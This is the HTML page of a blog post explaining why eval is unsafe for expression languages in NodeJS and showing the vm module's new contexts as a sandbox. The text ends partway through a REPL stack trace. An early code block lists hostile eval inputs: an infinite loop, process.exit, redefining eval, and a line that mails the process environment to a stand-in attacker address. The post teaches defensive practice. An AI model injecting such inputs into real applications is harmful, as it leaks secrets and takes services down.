
<!doctype html>
<!-- BEGIN _layouts/default.html -->
<html>
	<head>
		<meta charset="utf-8">
		
		<meta content="A safer alternative to implement expression parsers in NodeJS: let's look at eval, VM and VM2." name="description">
		<meta content="Alessandro Nadalin" name="author">
		
		<title>Eval no more: a journey through NodeJS' VM module, VM2 and Expression Language</title>
		<meta name="google-site-verification" content="dSNHLHJFQzKASjN8qHJisk2XLkKqbF_ilGSj9bscwKs" />
		<link href="/favicon.png" rel="icon">
		<link href="/stylesheets/screen.css" rel="stylesheet">
		<link href="/atom.xml" rel="alternate" title="Alessandro Nadalin" type="application/atom+xml">
		<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" type="text/css" href="/MyFontsWebfontsKit.css">

		<meta name="twitter:card" content="summary" />
		<meta name="twitter:creator" content="@_odino_" />
		<meta property="og:url" content="https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/" />
		<meta property="og:title" content="Eval no more: a journey through NodeJS' VM module, VM2 and Expression Language" />
		<meta property="og:description" content="A safer alternative to implement expression parsers in NodeJS: let's look at eval, VM and VM2." />
		
	</head>
	<body>
		<div class="wrap">
			<header>
				<div class="navi">
					<ul>
                        <li><a href="/"><i class="icon-home icon-large"></i> Home</a></li>
                        <li><a href="/about"><i class="icon-user icon-large"></i> About</a></li>
                        <li><a href="/conferences"><i class="icon-group icon-large"></i> Conferences</a></li>
                        <li><a href="/archives"><i class="icon-briefcase icon-large"></i> Archives</a></li>
                        <li><a href="/atom.xml"><i class="icon-rss icon-large"></i> RSS</a></li>
					</ul>
				</div>
			</header>
			<!-- BEGIN _layouts/post.html -->

    <header>
        <h1><a href="/eval-no-more-understanding-vm-vm2-nodejs/">Eval no more: a journey through NodeJS' VM module, VM2 and Expression Language</a></h1>
        <time>04 March 2017</time>
        <!-- 
        
        
        
          <br />
          <time>(note: this post was written 4 years ago and might be outdated)</time>
         -->
    </header>
<div class="entry-content "><p>How many times have you heard of <a href="https://www.google.ae/search?q=eval&amp;oq=eval&amp;aqs=chrome..69i57j69i60l3j0l2.673j0j7&amp;sourceid=chrome&amp;ie=UTF-8#q=eval+is+evil">how evil eval is</a>? Are there safer alternatives in the modern, server-side JavaScript ecosystem?</p>

<!-- more -->


<h2>The problem with eval</h2>

<p><img class="right" src="/images/security.png"></p>

<p><code>eval</code> is not necessary evil &mdash; you <em>just</em> need to make sure you&rsquo;re dealing with
trusted inputs.</p>

<p>The problem lies in that &ldquo;just&rdquo;, as you can&rsquo;t 100% guarantee that the source of
the eval-ed code (a DB, a file) won&rsquo;t get compromised at any point in time.</p>

<p>Long story short: <strong>consider all code that goes through an <code>eval</code> untrusted</strong>.</p>

<p>Here&rsquo;s some funny things <code>eval</code> can do:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="c1">// Guess what?</span>
</span><span class='line'><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;while(true) console.log(1)&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The application goes on...&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// What if the attacker doesn&#39;t want to waste time?</span>
</span><span class='line'><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;process.exit(0)&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The application goes on...&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Let&#39;s escalate...</span>
</span><span class='line'><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;require(&quot;node-mailer&quot;).mail(&quot;attacker@example.com&quot;, JSON.stringify(process.ENV))&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The application goes on...&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// And, for the lolz:</span>
</span><span class='line'><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;eval = undefined&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The application goes on...&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The last example is the one I like the most: there an attacker would re-define
the <code>eval</code> function itself, causing the application to crash (<code>TypeError: eval is not a function</code>)
the next time that block of code is executed.</p>

<p>Now that we&rsquo;ve seen some basic examples on how you could easily tear down an
application that uses <code>eval</code> too eagerly, let&rsquo;s take a step back and try
to figure out when it could be a good idea to execute &ldquo;external&rdquo; code
on-the-fly.</p>

<h2>Free the code!</h2>

<p>Ever heard of the <a href="https://en.wikipedia.org/wiki/Unified_Expression_Language">expression language</a>, or EL?</p>

<p>It&rsquo;s kind of a specification that defines a programming language used to evaluate
expressions such as:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">car</span><span class="p">.</span><span class="nx">maker</span> <span class="o">==</span> <span class="s1">&#39;BMW&#39;</span> <span class="c1">// returns a bool</span>
</span></code></pre></td></tr></table></div></figure>


<p>as opposed to having to deal with the syntax and quirks of each and every language &mdash; think of
PHP&rsquo;s <a href="http://phpsadness.com/">dollar sign and weird arrow-syntax</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="nv">$car</span><span class="o">-&gt;</span><span class="na">getMaker</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;BMW&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p><span class='pullquote-right' data-pullquote='you can let
non-programmers customize aspects of your applications through these expressions'>
Long story short, EL is a very <strong>lightweight programming
language</strong> that provides convenient shortcuts so that <strong>any non-technical person can
write code</strong>: initially thought of as a nicer replacement for writing regular code into HTML
templates, it&rsquo;s been widely used in the Java ecosystem and the <a href="http://symfony.com/doc/current/components/expression_language.html">Symfony2 framework</a>
popularized it in the PHP world.</p>

<p>Why am I telling you this? Well, because it&rsquo;s damn convenient, as you can let
non-programmers customize aspects of your applications through these expressions.
For example, imagine someone from your SEO team giving you a human-readable YAML
file like the following:
</span></p>

<figure class='code'><figcaption><span>seo-rules.yml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">rules</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">category(&quot;new articles&quot;) &amp;&amp; country(&quot;UK&quot;)</span>
</span><span class='line'>    <span class="l-Scalar-Plain">keywords</span><span class="p-Indicator">:</span> <span class="s">&quot;latest</span><span class="nv"> </span><span class="s">news,</span><span class="nv"> </span><span class="s">London,</span><span class="nv"> </span><span class="s">Manchester&quot;</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">category(&quot;new articles&quot;) &amp;&amp; country(&quot;IT&quot;)</span>
</span><span class='line'>    <span class="l-Scalar-Plain">keywords</span><span class="p-Indicator">:</span> <span class="s">&quot;ultime</span><span class="nv"> </span><span class="s">notizie,</span><span class="nv"> </span><span class="s">Roma,</span><span class="nv"> </span><span class="s">Milano&quot;</span>
</span><span class='line'><span class="nn">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can then import it in your application and add keywords to your webpage based
on those conditions &mdash; with code that would look like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">function</span> <span class="nx">category</span><span class="p">(</span><span class="nx">title</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">title</span> <span class="o">===</span> <span class="nx">req</span><span class="p">.</span><span class="nx">category</span><span class="p">.</span><span class="nx">title</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">country</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">code</span> <span class="o">===</span> <span class="nx">req</span><span class="p">.</span><span class="nx">country</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="nx">keywords</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span><span class='line'><span class="kd">let</span> <span class="nx">rules</span> <span class="o">=</span> <span class="nx">parse</span><span class="p">(</span><span class="s1">&#39;./rules.yml&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nx">rules</span><span class="p">.</span><span class="nx">each</span><span class="p">(</span><span class="nx">rule</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="nx">rule</span><span class="p">.</span><span class="nx">expr</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">keywords</span> <span class="o">+=</span> <span class="nx">rule</span><span class="p">.</span><span class="nx">keywords</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{}</span>
</span><span class='line'><span class="p">})</span>
</span></code></pre></td></tr></table></div></figure>


<p>The advantage of using an expression language is that you don&rsquo;t  need to build
a full fledged CMS to customize various parts of your applications &mdash; import a
file (or a spreadsheet) and you&rsquo;re done.</p>

<p>Doing this in JavaScript is even easier, as expressions are, fundamentally, valid
JS code that can be executed without the need of a <a href="http://symfony.com/doc/current/components/expression_language/extending.html">custom parser</a>.
Let&rsquo;s take a look at some expressions from the <a href="http://symfony.com/doc/current/components/expression_language.html">Symfony2 website</a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">product</span><span class="p">.</span><span class="nx">stock</span> <span class="o">&lt;</span> <span class="mi">15</span>
</span><span class='line'>
</span><span class='line'><span class="nx">article</span><span class="p">.</span><span class="nx">commentCount</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="o">&amp;&amp;</span> <span class="nx">article</span><span class="p">.</span><span class="nx">category</span> <span class="k">in</span> <span class="p">[</span><span class="s2">&quot;misc&quot;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="nx">data</span><span class="p">[</span><span class="s2">&quot;life&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="nx">data</span><span class="p">[</span><span class="s2">&quot;universe&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="nx">data</span><span class="p">[</span><span class="s2">&quot;everything&quot;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="nx">life</span> <span class="o">+</span> <span class="nx">universe</span> <span class="o">+</span> <span class="nx">everything</span>
</span></code></pre></td></tr></table></div></figure>


<p>These are all <strong>valid examples of JS code</strong>: some operators
work a little bit differently (for example <code>in</code> will mainly  work with
objects, not arrays) but, if you&rsquo;re not too creative, you can basically make
sure your expressions are valid JS that can be executed without a custom
parser<sup id='fnref:1'><a href='#fn:1' rel='footnote'>1</a></sup>.</p>

<p>At <a href="https://en-ae.namshi.com/">Namshi</a>, for example, we allow our marketing
team to create voucher codes based on expressions that look like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">expr</span><span class="o">:</span> <span class="nx">order_subtotal_by_brand</span><span class="p">(</span><span class="s2">&quot;nike&quot;</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;USD&quot;</span><span class="p">)</span>
</span><span class='line'><span class="nx">discount</span><span class="o">:</span> <span class="mi">10</span>
</span><span class='line'><span class="nx">type</span><span class="o">:</span> <span class="nx">percent</span>
</span></code></pre></td></tr></table></div></figure>


<p>(this would apply a 10% discount if the customer purchases at least 50 USD in Nike
products)</p>

<p>Now, you might think you just found the holy grail that allows you to avoid
building a complicated CMS and let stakeholders write that code for you &mdash; so
you start hacking around, come up with a prototype, everyone is extremely stoked
and it goes into production within a few days. Now your SEO guy can customize
all of the metatags in your pages by simply requesting you to deploy an updated
version of <code>seo-rules.yml</code>.</p>

<p>Then, <strong>disaster strikes</strong>.</p>

<h2>Eval is not a sandbox</h2>

<p><img class="right" src="/images/expression-language.jpg"></p>

<p>Even assuming your SEO guy is responsible enough to not make basic mistakes such
as toying around with the file and forgetting a <code>while</code> loop in one of the conditions,
you&rsquo;re still facing a potentially high security threat &mdash; a user
might steal the email credentials of our SEO hero and send you a new version of
<code>seo-rules.yml</code> that contains dangerous code, asking you to deploy those changes
urgently. Since you trust the SEO guy, you don&rsquo;t even review it, go live and&hellip;</p>

<p>&hellip;good luck.</p>

<p><span class='pullquote-right' data-pullquote='If the expression uses a variable that is not defined within its context, the evaluation
will then throw an error, which is exactly what prevents code from breaking out of its intended scope'>
The way EL has been implemented in Java, PHP and other languages is within the
context of a sandbox, where &ldquo;accidental&rdquo; code cannot do harm outside of the expression.
These languages have lexers, parsers and tokenizers that convert each and every
bit of the expression into a tree and execute it &ldquo;safely&rdquo;, without letting it
access variables, functions or APIs that haven&rsquo;t been defined while building the
expression itself.</p>

<p>Simply put, let&rsquo;s look at the following example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">a</span> <span class="o">===</span> <span class="nx">b</span> <span class="o">?</span> <span class="nx">c</span><span class="p">()</span> <span class="o">:</span> <span class="nx">d</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>An expression evaluator first tries to make sure the
expressions is syntactically valid and then figures out if all its components
are defined: in this case <code>a</code>, <code>b</code>, <code>c</code> and <code>d</code> need to be defined
within the context of the expression to be able to execute it.</p>

<p>That makes it so that, generally, we will be required to invoke the expression
like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">evaluate</span><span class="p">(</span><span class="nx">expr</span><span class="p">,</span> <span class="p">{</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span><span class="p">})</span>
</span></code></pre></td></tr></table></div></figure>


<p>If the expression uses a variable that is not defined within its context, the evaluation
will then throw an error, which is exactly what prevents code from breaking out of its intended scope to begin
with: <code>process</code>, <code>console</code>, <code>fs</code> and so on won&rsquo;t be available for an attacker to take
advantage of.</p>

<p>Instead, <code>eval</code> directly <strong>executes code and has access to the same scope</strong> it&rsquo;s
been called from<sup id='fnref:2'><a href='#fn:2' rel='footnote'>2</a></sup>: since it&rsquo;s missing a sandboxing feature,
it is a very risky and, in my opinion, a poor choice for implementing an expression
evaluator.
</span></p>

<h2>Enter VM</h2>

<p>Now, imagine you could run some JS code in a new &ldquo;node process&rdquo; that has no access
to the standard node library &mdash; no <code>process</code>, no <code>console</code>, just basic plain JS: that&rsquo;s
what the <code>vm</code> module lets you do.</p>

<p>Let&rsquo;s take a look at this example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;a + 1&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">2</span><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="c1">// 3</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we are asking Node to create a new <a href="https://nodejs.org/api/vm.html#vm_what_does_it_mean_to_contextify_an_object">V8 context</a> and run a bunch of code
(<code>a + 1</code>) there for us, passing an object that constitutes the global environment of
that new context (<code>{a: 2}</code>).</p>

<p>Note that the current execution context is not affected by what happens in that
new context:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;a += 1&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">a</span><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="c1">// 0</span>
</span></code></pre></td></tr></table></div></figure>


<p>unless you specifically tell the VM that you want to re-use an existing context
or to use the current context with <code>vm.runInThisContext</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="nx">vm</span><span class="p">.</span><span class="nx">runInThisContext</span><span class="p">(</span><span class="s1">&#39;a += 1&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="c1">// 1</span>
</span></code></pre></td></tr></table></div></figure>


<p>When you use the current execution context (<code>runInThisContext</code>)
the executed code is going to have access to globally-defined variables of the current
context which, of course, exposes us to the same kind of problems we&rsquo;d have with
<code>eval</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInThisContext</span><span class="p">(</span><span class="s1">&#39;process.exit(0)&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="c1">// this will never run</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, let&rsquo;s stick to running our code on brand new execution contexts through <code>vm.runInNewContext</code>.</p>

<p>A nice &ldquo;feature&rdquo; of new contexts is that, by default, they can only be used to
execute plain old JS, as they don&rsquo;t have access to functions / node modules
unless <strong>you</strong> inject those in the context.</p>

<p>You can try it out for yourself in node&rsquo;s REPL:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="o">~</span> <span class="p">(</span><span class="nx">master</span> <span class="err">✔</span><span class="p">)</span> <span class="err">ᐅ</span> <span class="nx">node</span>
</span><span class='line'><span class="o">&gt;</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;1 + 1&#39;</span><span class="p">)</span>
</span><span class='line'><span class="mi">2</span>
</span><span class='line'>
</span><span class='line'><span class="o">&gt;</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;1 + a&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nx">ReferenceError</span><span class="o">:</span> <span class="nx">a</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">defined</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">evalmachine</span><span class="p">.</span><span class="o">&lt;</span><span class="nx">anonymous</span><span class="o">&gt;:</span><span class="mi">1</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">29</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInNewContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">15</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">runInNewContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">74</span><span class="o">:</span><span class="mi">17</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">repl</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">4</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">realRunInThisContextScript</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">22</span><span class="o">:</span><span class="mi">35</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">sigintHandlersWrap</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">98</span><span class="o">:</span><span class="mi">12</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInThisContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">24</span><span class="o">:</span><span class="mi">12</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">REPLServer</span><span class="p">.</span><span class="nx">defaultEval</span> <span class="p">(</span><span class="nx">repl</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">346</span><span class="o">:</span><span class="mi">29</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">bound</span> <span class="p">(</span><span class="nx">domain</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">280</span><span class="o">:</span><span class="mi">14</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="o">&gt;</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;1 + a&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">})</span>
</span><span class='line'><span class="mi">2</span>
</span><span class='line'>
</span><span class='line'><span class="o">&gt;</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="s1">&#39;console.log(123)&#39;</span><span class="p">)</span>
</span><span class='line'><span class="nx">ReferenceError</span><span class="o">:</span> <span class="nx">console</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">defined</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">evalmachine</span><span class="p">.</span><span class="o">&lt;</span><span class="nx">anonymous</span><span class="o">&gt;:</span><span class="mi">1</span><span class="o">:</span><span class="mi">1</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">29</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInNewContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">15</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">runInNewContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">74</span><span class="o">:</span><span class="mi">17</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">repl</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">4</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">realRunInThisContextScript</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">22</span><span class="o">:</span><span class="mi">35</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">sigintHandlersWrap</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">98</span><span class="o">:</span><span class="mi">12</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">at</span> <span class="nx">ContextifyScript</span><span class="p">.</span><span class="nx">Script</span><span class="p">.</span><span class="nx">runInThisContext</span> <span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">js</span><span class="o">:</span><span class="mi">24</span><span class="o">:</span><span class="mi">12</span><span class="p">)</span>
